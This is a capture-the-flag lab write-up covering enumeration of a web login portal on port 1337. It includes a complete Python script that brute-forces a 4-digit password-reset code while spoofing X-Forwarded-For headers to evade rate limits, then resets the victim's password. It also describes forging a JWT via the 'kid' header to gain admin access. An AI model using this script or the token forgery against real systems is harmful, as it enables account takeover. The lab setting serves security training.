# Enumeration
Kicking off this process with an nmap scanning
<img width="720" height="275" alt="Screenshot 2025-11-15 162422" src="https://github.com/user-attachments/assets/95e728d0-fa01-4d2c-baaa-84bda358b2d6" />
```
nmap -T4 -p- {IP}
```
Excepting for port 22, the target also has port 1337 open which might be my target from now.
Here is the overview of the port 1337 which turn out to be a login portal requiring email and password
<img width="950" height="473" alt="Screenshot 2025-11-16 164333" src="https://github.com/user-attachments/assets/34592d07-74fe-421b-96f4-e5e379fead17" />

Inspecting the page source I find that the convention for endpoints start with `hmr_`
<img width="952" height="474" alt="Screenshot 2025-11-15 195826" src="https://github.com/user-attachments/assets/98948a32-9dc7-42e3-8199-28be880aa8b8" />

I use ffuf, which is a fuzzing tool, to find hidden endpoints
<img width="718" height="105" alt="Screenshot 2025-11-15 200735" src="https://github.com/user-attachments/assets/3353bbb6-92d7-4b7f-ae59-4f15366fb5d0" />
```
ffuf -u http://{IP}:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt -c 2>/dev/null
```
Observing the endpoint `hmr_logs`, I find these useful information
<img width="1043" height="644" alt="Screenshot 2025-11-15 200746" src="https://github.com/user-attachments/assets/e437bff4-2d26-491f-976c-79575a9b4ecb" />
email: tester@hammer.thm
Now I find that there is a Forget password function which I need to explore more. Well, the email is valid which mean that I need to do something in order to brute-force the entering recovery code
<img width="952" height="473" alt="Screenshot 2025-11-16 164348" src="https://github.com/user-attachments/assets/3eb70111-0094-49d2-89ac-3361335c77ea" />

So I actually prompt chatGPT for the python code in order to achieve this problem. Furthermore I add a function called reset password to a fix password (password123) in that script as well under script called `exploit.py`
```
#!/usr/bin/env python3
import requests
import random
import threading

IP = input("Enter your target: ")
url = "http://{IP}:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50


def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text and "new_password" in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Sending the new password request.")
                    new_password = "password123"
                    session.post(
                        url,
                        data={
                            "new_password": new_password,
                            "confirm_password": new_password,
                        },
                        headers={
                            "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                        },
                    )
                    print(f"[+] Password is set to {new_password}")
                    return
        except Exception as e:
            # print(e)
            pass


def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()

```
just run this command `python3 exploit.py` and boom the password of `tester@hammer.thm` has been set to `password123` 
After Login, I have the first Flag and get redirected to dashboard.php which is a browser command base. Attempting with some basic commands but only `ls` work 
<img width="959" height="594" alt="Screenshot 2025-11-16 152352" src="https://github.com/user-attachments/assets/5dce0bbc-86a6-431f-a50b-3de34dd05da2" />

The file `188ade1.key` is intestering which I can read it on my terminal 
<img width="717" height="41" alt="Screenshot 2025-11-16 153118" src="https://github.com/user-attachments/assets/c8d28d48-6e2b-422a-b227-bb3f222d6225" />

What about `execute_command.php`
<img width="1134" height="708" alt="Screenshot 2025-11-16 152619" src="https://github.com/user-attachments/assets/c4f6daf5-19c0-4766-abde-1a55592529fe" />

It states that I was missing header but which header? I use Burp Suite to intercept that request and nothing catch my eyes
<img width="935" height="495" alt="Screenshot 2025-11-16 153645" src="https://github.com/user-attachments/assets/6fb20e2d-c35b-4aa5-8122-fd4ac032c70d" w/>

However, when I intercept the dashboard.php page, an authorization bearer is included
<img width="466" height="502" alt="Screenshot 2025-11-16 160247" src="https://github.com/user-attachments/assets/70f2e0f0-7d70-4924-89d7-7b6f985e989c" />

Next I pay a visit to the page called (jwt.io)[https://www.jwt.io/] to craft my payload which I need to modify the bearer of `tester@hammer.thm` with 2 sections `kid` to `www/data/html/88ade1.key` and `role` to `admin`. Regarding the signature, I attempted to inject the content of `188ade1.key` and it is verified.
<img width="765" height="629" alt="Screenshot 2025-11-16 160402" src="https://github.com/user-attachments/assets/c6186449-2cba-47ea-bd3f-a947b3ec7aef" />
Finally it works and I get my last flag

